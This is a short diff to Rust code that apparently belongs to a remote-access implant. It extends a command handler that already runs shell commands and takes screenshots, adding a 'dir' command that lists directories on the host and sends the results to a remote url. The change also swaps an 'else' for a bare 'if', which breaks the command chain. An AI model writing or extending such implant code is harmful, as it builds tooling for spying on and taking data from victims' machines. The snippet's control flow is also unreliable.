@@ -38,7 +38,6 @@ pub fn filter_command(message:&Value){
                         type_:String::from("list")
                     };
                     requests::send_json_request(Method::GET, url, Some(&result_response));
-                    
                 }
                 else if command.starts_with("screenshot") {
                     println!("the command is screenshot command {}", command);
@@ -75,7 +74,29 @@ pub fn filter_command(message:&Value){
                         type_:String::from("shell")
                     };
                     requests::send_json_request(Method::GET, url, Some(&result_response));
-                } else {
+                } if command.starts_with("dir ") || command =="dir"{
+                    if command == "dir" {
+                        command = ".";
+                    }else{
+                        command = command.strip_prefix("dir ").unwrap_or(&command);
+                    }
+                    
+                    println!("the command is dir command {}", command );
+                    let (response, result) = listdir::list_dir_travel(command);
+                    let final_response = Response{
+                        response :response,
+                        id:String::from(id),
+                        type_:String::from("dir")
+                    };            
+                    requests::send_json_request(Method::GET, url, Some(&final_response));
+                    let result_response= Response2{
+                        result:result,
+                        id:String::from(id),
+                        type_:String::from("dir")
+                    };
+                    requests::send_json_request(Method::GET, url, Some(&result_response));
+                }
+                else {
                    let result_response = Response2{
                         result: String::from("Unknown command"),
                         id: String::from(id),
